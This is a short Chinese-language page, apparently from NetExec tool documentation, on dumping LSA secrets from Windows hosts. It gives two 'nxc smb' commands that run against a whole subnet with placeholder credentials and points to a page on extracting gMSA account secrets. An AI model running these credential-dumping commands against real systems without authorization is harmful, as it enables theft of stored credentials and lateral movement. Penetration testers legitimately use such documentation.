# 导出 LSA

### 使用 secretsdump.py 中的方法导出 LSA 机密

{% hint style="danger" %}
需要在目标域控制器上拥有域管理员或本地管理员权限
{% endhint %}

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
```

如果此命令失败，您也可以尝试旧方法（类似于 secretdump）

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa secdump
```

如果您找到一个以 _SC\_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} 开头的账户，您可以获取背后的账户：

{% content-ref url="../../ldap-protocol/extract-gmsa-secrets.md" %}
[extract-gmsa-secrets.md](../../ldap-protocol/extract-gmsa-secrets.md)
{% endcontent-ref %}
